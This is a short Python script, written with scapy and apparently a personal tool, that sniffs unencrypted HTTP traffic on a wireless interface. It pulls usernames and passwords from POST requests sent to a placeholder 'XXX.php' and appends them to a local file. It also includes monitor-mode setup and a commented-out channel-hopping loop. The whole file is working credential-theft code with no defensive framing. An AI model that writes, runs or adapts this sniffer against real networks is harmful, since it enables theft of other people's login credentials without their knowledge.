#!/usr/bin/env python
# -*- coding: utf-8 -*-

__DATE__   = '22.06.2016'
__AUTHOR__ = 'cemonatk'

import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import * 
from scapy.layers import http
from subprocess import check_output,call
import os.path

datalist	= {}
arayuz		= 'wlan0'
uri			= 'XXX.php'
file		= 'data.txt'

def Mon():
	if 'sniffer' not in check_output('iw dev', shell=True):
		call('sudo iw phy phy0 interface add sniffer type monitor', shell=True)

def Store(UyeAdi, Sifre):
    datalist[UyeAdi] = Sifre

def Write(UyeAdi,Sifre):
	print "\n"+UyeAdi
	print Sifre+"\n"
	temp = "\n%s\t\t%s\n" % (str(UyeAdi),str(Sifre))
	if os.path.isfile(file) != True:
		open(file,'w').write(temp)
	else:
		open(file,'a+').write(temp)

def Sniffer(pkt):
	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		if pkt[TCP].dport == 80: 
			paket= str(pkt[Raw].load)
			if paket.find(uri):
				paket = str(paket)
				data = paket.split('&');del data[0],data[1],data[1]
				Store(data[0],data[1])

				for key,value in datalist.iteritems():
					Write(key,value)

#Mon()
sniff(iface=arayuz, prn=Sniffer)


"""
while 1:
	for channel in range(1, 14):
		print channel
		#call("iwconfig " + arayuz "channel " + str(channel), shell=True)
		os.system("iwconfig " + arayuz + " channel " + str(channel))
		sniff(iface=arayuz, prn=Sniffer) #count=20, timeout=5)

#ifconfig wlan0 promisc
#ip link set eth1 promisc on

def Mon():
	if 'sniffer' not in check_output('iw dev', shell=True):
		call('sudo iw phy phy0 interface add sniffer type monitor', shell=True)
"""